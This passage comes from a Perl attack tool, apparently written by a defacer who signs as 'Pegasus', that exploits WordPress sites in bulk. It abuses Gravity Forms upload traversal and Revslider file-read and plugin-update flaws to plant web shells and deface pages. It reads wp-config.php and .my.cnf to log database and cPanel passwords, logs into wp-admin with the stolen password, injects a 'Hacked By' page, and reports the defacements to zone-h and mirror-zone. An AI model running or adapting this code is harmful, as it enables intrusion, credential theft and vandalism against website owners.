    open(save, '>>Result/vulntargets.txt');   
    print save "[gravi] $site\n";   
    close(save);

    print "[SCANING SHELL] ............ ";
    open(save, '>>Result/libs.txt');
        print save "$site/_input_3_Pegasus.php5\n";
        close(save);
    my $checkgrav = $ua->get("$site/_input_3_Pegasus.php5")->content;
    my $checkkgrav = $ua->get("$site/xPegasusx.php")->content;
        if($checkkgrav =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
    print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "UPLODED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SHELL LINK] => $site/xPegasusx.php \n";
        open(save, '>>Result/shells.txt');  
        print save "[GRAVITY]  $site/xPegasusx.php\n";   
        close(save);

# get uname and path on server 
my $checkgasss = $ua->get("$site/un.php")->content;
            if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b>Pegasus/){
    print "\n";
print colored ("[PATH] : $1",'black on_yellow'),"\n\n";
print colored ("[KERNEL]:$2",'black on_yellow'),"\n";
print "\n";
            open(save, '>>Result/shells.txt'); 
            print save "Path : $1\nKernel:$2\n";    
            close(save);
            $def="$site/Pegasus.html";
            zoneh();
            mirrorzon();
}
#### get info Done ..//// 



    }else{
            
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR!!";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
upindex();



}





}else{  print " ............ ";
    print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}
}

sub upindex{
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "Pegasus.html"]);
print "[DEFACE] ....................";
if ($indexploit->decoded_content =~ /_input_3_Pegasus.html/) {
    $def= $site . '_input_3_Pegasus.html';
    print color('bold white');
print " [";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] ";
print color('reset');
print"\n";
        print colored ("[INDEX LINK] => $def ",'black on_red'),"\n";
        zoneh();
        mirrorzon();
       }else{
        print ".. [ERROR]\n";
       }
   }
####################################################################################################
####################################################################################################
#####################################       REVSLIDER       ########################################
####################################################################################################
####################################################################################################
sub getconfig{
print colored ("[REVSLIDER GETCONFIG]",'white on_red');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print " .......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("red"),"\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("white"),"\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("red"),"\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("white"),"\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
   print " ...... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset'); 
getcpconfig();

}

}

####################################################################################################
####################################################################################################

sub getcpconfig{
print colored ("[REVSLIDER GET CPANEL]",'white on_red');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print " ...... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "FOUNDED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print color("red"),"\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print color("white"),"\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{print " .. ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT FOUNDED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}


}




####################################################################################################
####################################################################################################
####################################################################################################
sub revdef(){
print colored ("[DEFACE AJAX]",'white on_red');

$ajx = $site . 'wp-admin/admin-ajax.php';

$def = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

$gassface = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By Fallag Pegasus</b><br>Pegasus<p style='color: transparent'>"];
$response = $ua->request($gassface);
$stat = $response->content;
 if ($stat =~ /true/){
print  " ............... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');


my $checkajx= $ua->get("$def")->content;
if($checkajx =~/Hacked|Fallaga|Pegasus/) {

        open(save, '>>Result/vulntargets.txt');   
    print save "[rev deface] $site\n";   
    close(save);

print "[DEFACE] .................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[LINK INDEX] .................. ";
    print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SAVED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset'); 

zoneh();
mirrorzon();
}
}else{
    print " ................. \n";
    print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset'); 

}
}
####################################################################################################
####################################################################################################
############################### PHP MY ADMIN SCANNER ##############################################
####################################################################################################
####################################################################################################
sub zebbi{
print colored ("[PMA SCANNER]",'white on_red');
print " .................. ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "[$pma] .............. ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "FOUNDED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[PhpMyAdmin]$url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "[$pma] .......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT FOUNDED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}}
print "[PMA SCAN] ..................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "DONE";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
revdef();

}
####################################################################################################
####################################################################################################
####################################### WORDPRESS BRUTE ############################################
####################################################################################################
####################################################################################################
sub wpbrute{
print colored ("[BRUTE WITH CONFIG PASS]",'white on_red');
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print " ....... ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[INFO] USER : $admin\n[INFO] PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "[BRUTE] ............... ";
            print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "LOGIN SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
        open (TEXT, '>>Result/brute.txt');
        print TEXT "\n[BRUTE][BOOM] $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print "[BRUTE]..";
            print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "USER AND PASSWORD DONT MATCH";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}
zebbi();
}
####################################################################################################
####################################################################################################
##################################     REVSLIDER SHELL     #########################################
####################################################################################################
####################################################################################################
sub revshell(){
print colored ("[REVSLIDER SHELL]",'white on_red');
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $zip = "revslider.zip";
my $action;
my $update_file;
$action = "revslider_ajax_action";
$update_file = "$zip";
my $targd = "wp-admin/admin-ajax.php";
my $herwgo = "$site/wp-content/plugins/revslider/temp/update_extract/revslider/herewgo.php"; 

sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $exploit = $ua->post("$site/$targd", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);
if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
print " .............. ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[UPLOAD SHELL]";
my $exploitrevshell = $ua->get("$herwgo")->content;
my $exploitrevshellz = $ua->get("$site/xPegasusx.php")->content;
if($exploitrevshellz =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
    print " ................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SHELL LINK] => $site/xPegasusx.php\n";
    open(save, '>>Result/shells.txt');  
    print save "[REVSLIDER] $site/xPegasusx.php\n";  
    close(save);
my $checkun = $ua->get("$site/un.php")->content;
if($checkun =~ /path:(.*)<b><br>uname:(.*)<br><\/b>Pegasus/){
    print "\n";
print colored ("Path : $1",'black on_yellow'),"\n\n";

print colored ("Kernel:$2",'black on_yellow'),"\n";
    open(save, '>>Result/shells.txt');  
    print save "Path : $1\nKernel:$2\n";
    close(save);
$def="$site/Pegasus.html";
print "[INDEX LINK] => $def \n";

zoneh();
mirrorzon();
}
}else{
print " ................ ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
getconfig();
}
}
else {
print " .......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

getconfig();
}
}

####################################################################################################
####################################################################################################
######################################    zone h poster      #######################################
####################################################################################################
####################################################################################################
sub zoneh(){
#  // this to post all our deface on zone-h //
print colored ("[ZONE-H]",'black on_yellow');
    open(save, '>>Result/index.txt');   
    print save "$def\n";   
    close(save);
                                
                                $hack="Pegasus"; # chaneg Pegasus by Your zone h name :p - thats not recode lamerz lol ..//
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
                                print " ...................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
                                print " ......................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');


                                }
                                else
                                {
                                print colored ("[ERROR !]Error Can't Submit it On Zone-h Pegasus",'white on_red'),"\n";

                                }
                            }
####################################################################################################
####################################################################################################
##################################### Mirror zone poster     #######################################
####################################################################################################
####################################################################################################
sub mirrorzon(){
    #  for mirror zone post xD 
    print colored ("[MIRROR-ZONE]",'black on_yellow');
$mz = "http://mirror-zone.org/notify/singel.php";
$fgtn="Pegasus"; # u can change it by ur name on mirror zone and plz madafaking bitchs dont call this recode lol !
$mzp = POST $mz, [hacker => $fgtn, text => $def];
$response = $ua->request($mzp);
if ($response->content =~ /Deface Add successfully added to Archive .../) {
print " .................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}else {
print " ................. ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}
}
